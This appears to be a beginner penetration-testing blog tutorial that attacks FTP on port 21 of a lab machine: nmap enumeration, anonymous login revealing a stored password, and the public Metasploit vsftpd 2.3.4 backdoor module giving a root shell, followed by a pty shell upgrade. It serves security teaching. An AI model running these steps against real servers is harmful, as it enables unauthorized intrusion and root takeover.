---
title: Hacking for Beginners - Port 21 Pentesting
date: 2023-09-10 00:00:00 -500
categories: [Hacking for Beginners, Pentesting]
tags: [FTP, nmap, CTFs, Hacking]
image:
  path: /assets/img/Pentest/ftp.jpg
---

Hello H4ck3rs, did you know In the world of cybersecurity, knowledge is power. For those looking to embark on a journey into ethical hacking, understanding the intricacies of various network ports is essential. One such port that often catches the attention of aspiring hackers is Port 21. In this article, we'll take a closer look at Port 21, diving into the basics of hacking for beginners. 

But before we start, we invite you to join our vibrant Hacking Journey community on **Discord!** Connect with like-minded hackers, share your experiences, and get ready for more thrilling challenges.
Whether you're a seasoned pro or just getting started, there's a place for you in our community. **Let's learn, explore, and hack together**. **Join us on Discord [here](https://discord.gg/wBT9wr9ruG)**.

## **What is FTP?**
FTP (File Transfer Protocol) is used to communicate and transfer files between computers on a TCP/IP (Transmission Control Protocol/Internet Protocol) network, aka the internet. Users, who have been granted access, can receive and transfer files in the File Transfer Protocol server (also known as FTP host/site). 
The File Transfer Protocol (FTP) is a fundamental component in the world of hacking. FTP allows for the smooth exchange of files across computer networks. While once widely used, FTP's dated security features have made it an appealing target for ethical hackers.

## **Hacking the Port 21**: A Practical Approach for Beginners

### Enumeration: Scanning FTP Port Using nmap 

Enumeration is a critical phase in the process of hacking Port 21. It involves systematically gathering information about the target FTP server, which is invaluable for identifying potential vulnerabilities and crafting effective attacks. In this section, we'll explore the techniques and tools that ethical hackers use to enumerate FTP servers on Port 21.

One of the popular tools hackers use to check if Port 21 is open on a target system is called `Nmap`. `Nmap` is a versatile network scanning tool that helps identify open ports, services, and more on a target host.
```terminal
┌──(root㉿kali)-[/home/kali]
└─# nmap -p21 192.168.11.135                            
Starting Nmap 7.93 ( https://nmap.org ) at 
2023-09-10 09:13 EDT
Nmap scan report for 192.168.11.135
Host is up (0.00099s latency).

PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 00:0C:29:69:22:33 (VMware)
```
In this command snippet: 
  - `nmap` is the command to run Nmap.
  - `-p21` specifies that we are interested in Port 21.
  - `192.168.11.135` is the IP address of the target system.
When you run this command `Nmap` scans the target IP address (`192.168.11.135`) for open ports and reports back with its findings.

### Enumeration: Scanning Version

Now that we've confirmed that Port 21 is open on our target system, it's time to dig deeper and gather more information about the FTP server running on that port. This step is essential for ethical hackers as it helps identify the specific versions of software in use, potentially revealing known vulnerabilities.
To accomplish this, we can use `nmap` with the `-sV` flag. Here's how the command looks:

```terminal
┌──(root㉿kali)-[/home/kali]
└─# nmap -sV -p21 192.168.11.135 
Starting Nmap 7.93 ( https://nmap.org ) 
at 2023-09-10 09:29 EDT
Nmap scan report for 192.168.11.135
Host is up (0.00046s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 00:0C:29:69:22:33 (VMware)
Service Info: OS: Unix
```

 - `-p21` specifies Port 21 for FTP.
 - `-sV` tells Nmap to perform version detection. which is vsftpd 2.3.4 
In the exploitation Section we will use this version to see if any exploit is available to `Hack` this `FTP` version
### Enumeration: Running Default nmap Script's

The enumeration is the important Step of our Penetration Testing and In this section, we continue our enumeration process with a specific focus on running default `Nmap` scripts. These scripts are a powerful tool in the arsenal of ethical hackers, allowing us to gather valuable information and uncover potential vulnerabilities on the FTP server. 
The `-sC` flag in Nmap instructs it to run default scripts against the target host. These scripts are designed to perform a wide range of tasks, from service discovery to vulnerability detection.
Take a look at this Nmap scan result used with the `-sC` :

```terminal
└─# nmap -sC -sV -p21 192.168.11.135
Starting Nmap 7.93 ( https://nmap.org ) 
at 2023-09-10 09:45 EDT
Nmap scan report for 192.168.11.135
Host is up (0.00045s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.11.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
MAC Address: 00:0C:29:69:22:33 (VMware)
Service Info: OS: Unix
```
Interesting, Let's break down the Nmap command and examine what it tells us about our target FTP server.
  - `nmap` is the command to run Nmap.
  - `-sC` tells Nmap to run default scripts against the target host.
  - `-sV` instructs Nmap to perform version detection.
  - `-p21` specifies that we are interested in Port 21 (FTP).
  - `192.168.11.135` is the IP address of our target FTP server.

Now, let's take a look at the output:

```terminal
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.11.12x
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
```
Here, we gain insights into the FTP server's status:

  - `Connected to 192.168.11.12x` indicates that our scanning device (192.168.11.128) has successfully connected to the FTP server.
  - `Logged in as ftp` reveals that a user named "ftp" is currently logged in. This information can be valuable for understanding the authentication setup.
  - `vsFTPd 2.3.4` - secure, fast, stable" provides further details about the FTP server's version, describing it as "secure, fast, and stable."
Of particular interest is the line:
```terminal
|_ftp-anon: Anonymous FTP login allowed (FTP code 230). 
```
It's very important for an attacker. This line informs us that the `FTP` server allows anonymous `FTP` login, which is indicated by `FTP code 230.` For an attacker, this information can be crucial, as anonymous access might open the door to potential vulnerabilities.

### Exploitation: Anonymous Login

The next step involves leveraging the gathered information to explore potential exploits and security gaps. In this section, we turn our attention to one such point of interest: `anonymous login`.
Our earlier enumeration efforts using `Nmap` have revealed that the `FTP` server `allows anonymous login`, a discovery that piques the interest of ethical hackers. `Anonymous login`, as the name suggests, provides an entry point without requiring explicit credentials. While this feature can be convenient for users, it can also be a goldmine for attackers if not properly secured.
To demonstrate anonymous login we can use as `username: anonymous `and` password: anonymous`, we'll use the following command:

```terminal
└─# ftp anonymous@192.168.11.135
Connected to 192.168.11.135.
220 (vsFTPd 2.3.4)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
Now we have logged in Successfuly, we can launch the `ls` command to see what's the files on this FTP server.

```terminal
ftp> ls 
229 Entering Extended Passive Mode (|||10037|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0              18 Sep 10 14:25 note.txt
-rw-r--r--    1 0        0              66 Sep 10 14:27 private.txt
226 Directory send OK.
ftp> 
```
we see that we have 2 files, we can run the `more` command to see what is on these files.
```terminal
ftp> more note.txt
FTP server Hacked
ftp> more private.txt
hello dear admin, your credentials is Passwor123, don't share it 
ftp> 
```
As we can see these output of `note.txt` and `private.txt` files, and here we have found another `pasword:Password123` on the `private.txt` file.

### Exploitation: Exploiting the Version
In our earlier discussion of [version scanning](#enumeration-scanning-version), we discovered that the FTP server was running vsFTPd version 2.3.4. Now, our next step is to explore potential exploits that can target this specific version.
To facilitate this exploration, we'll make use of a valuable tool known as searchsploit. This tool, provided by exploitdb, empowers us to search for exploits right on our local machine, making the process more efficient and focused.
Using that specific version i used:

```terminal
└─# searchsploit vsftpd 2.3.4
---------------------------------------
------------
-------------------
---------------- ---------------------------------
 Exploit Title                                                               
          |  Path
------------------------------------------
-------------------------------------------
- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                         
    | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) 
                               | unix/remote/17491.rb
```
Here, we have a list of potential exploits associated with vsFTPd 2.3.4:
- `vsftpd 2.3.4 - Backdoor Command Execution`: This exploit, identified by the path "unix/remote/49757.py," targets the FTP server's vulnerability, potentially allowing remote attackers to execute arbitrary commands.
- `vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)`: This is another exploit, found at "unix/remote/17491.rb," which leverages Metasploit to execute commands on the target server.

Now here i see that an Metasploit Exploit is Avalaible for this version of `FTP`. I will use Metasploit tool to exploit that.
i launched it using `msfconsole`:
```terminal
                      Metasploit

       =[ metasploit v6.3.27-dev                          ]
+ -- --=[ 2335 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View advanced module options with 
advanced
Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```
The first command i will do using `Metasploit` is the `search` command to help see any exploit avalaible for my search query:
```terminal
msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                            
         Disclosure Date  Rank       Check  Description

   
   -  ----                                  -------------
   --  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03   
       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0,
 use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
```
And here as you can see i found the exploit `vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)`. Now we are going to use it using the `use` command :
```terminal
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
use exploit/unix/ftp/vsftpd_234_backdoor
[*] Using configured payload cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
set rhosts 192.168.11.135
rhosts => 192.168.11.135
msf6 exploit(unix/ftp/vsftpd_234_backdoor) 
> exploit 

[*] 192.168.11.135:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.11.135:21 - USER: 331 Please specify the password.
[+] 192.168.11.135:21 - Backdoor service has been spawned, handling...
[+] 192.168.11.135:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.11.128:33417
 -> 192.168.11.135:6200) at 2023-09-10 11:21:23 -0400
```
Let's dive in our command :
- `use exploit/unix/ftp/vsftpd_234_backdoor` We begin by specifying the exploit we want to use. In this case, we've chosen the "vsftpd_234_backdoor" exploit for vsFTPd 2.3.4.
- `set rhosts 192.168.11.135` We set the target host (rhosts) to the IP address of the FTP server we're testing. This tells the exploit where to attempt the attack.
- `exploit` With everything set up, we initiate the exploit.
- `[*] Command shell session 1 opened (192.168.11.128:33417 -> 192.168.11.135:6200) at 2023-09-10 11:21:23 -0400` Tells us the machine has been successfuly exploited and we have a session opened.

Having successfully exploited the vsFTPd vulnerability, we've achieved a significant milestone in ethical hacking: gaining root access to the target machine. This level of access grants us the highest privileges, essentially making us the system's administrator.
```terminal
[*] Found shell.
[*] Command shell session 1 opened (192.168.11.128:44003 
  -> 192.168.11.135:6200) at 2023-09-10 11:52:35 -0400

id
uid=0(root) gid=0(root)
whoami
root
pwd
/
```
### UPGRADING OUR SHELL TO TTYs
To enhance our level of control over the exploited system, we can upgrade our current shell to a fully interactive TTY (teletypewriter) session. This provides a more responsive and feature-rich terminal experience, making it easier to interact with the system.
Here's how you can upgrade your shell to a TTY using Python:
```terminal
python -c 'import pty; pty.spawn("/bin/bash")'
root@metasploitable:/# 
```
Now, you have a fully interactive TTY shell, which allows for more advanced interactions with the target system. This can be particularly useful for performing tasks, exploring the system, and carrying out further ethical hacking activities.

## Conclusion:
Throughout this article, we've covered a range of essential concepts and techniques:
- **Enumeration**: We began by exploring the basics of scanning, version detection, and script enumeration, essential steps in understanding the target system.

- **Exploitation**: We delved into the process of identifying and executing exploits, demonstrating the importance of responsible testing and knowledge of vulnerabilities.

- **Gaining Control**: We achieved root access on the target system, highlighting the significance of securing systems against unauthorized intrusion.

- **Upgrading to TTY**: We enhanced our control with an interactive TTY shell, providing a more efficient and responsive hacking environment.
Thanks for reading. **Let's learn, explore, and hack together**. **Join us on Discord [here](https://discord.gg/wBT9wr9ruG)**. 